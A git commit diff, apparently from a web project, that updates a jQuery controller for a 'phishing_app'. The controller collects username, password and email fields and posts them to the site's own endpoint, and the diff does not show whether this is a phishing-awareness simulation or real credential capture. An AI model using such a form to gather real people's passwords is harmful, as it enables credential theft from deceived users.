3cd74b6d79d3d6a829329b5500f6bdbfda560073
dapcosta <dapcosta@hotmail.com>
2025-09-11 17:02:53 -0300

    update: phishing_app. Atualizado laytou

--- static/controllers/phishing_app/phishing_app_controller.js
+++ static/controllers/phishing_app/phishing_app_controller.js
@@ -1,26 +1,29 @@
-$(document).on('click', 'button', function(){
+
+
+$(document).on('click', '#envia_senha', function(){
 	let usuario = $('#usuario').val();
 	let senha = $('#senha').val();
 	let email = $('#email').val();
 	console.log(email)
 	let let_name_btn = $(this).attr('name');
 
-	if (let_name_btn == "envia_senha") {
-        $.ajax({
-            type:"POST",
-            url: '/phishing_app/',
-            dataType: 'json',
-            data: {
-                'usuario' : usuario,
-                'senha'   :   senha,
-                'email'   : email
-            },
-            success: function (data) {
-                $("#envia_senha").attr("disabled", true);
-            },
-            error: function (request, status, error) {
 
-            }
-        });
-	}
+    $.ajax({
+        type:"POST",
+        url: '/phishing_app/',
+        dataType: 'html',
+        data: {
+            'usuario' : usuario,
+            'senha'   :   senha,
+            'email'   : email
+        },
+        success: function (data) {
+            //$("#envia_senha").attr("disabled", true);
+            $("#div_conteudo_frm_phishing").html(data);
+        },
+        error: function (request, status, error) {
+            alert(error);
+        }
+    });
+
 });
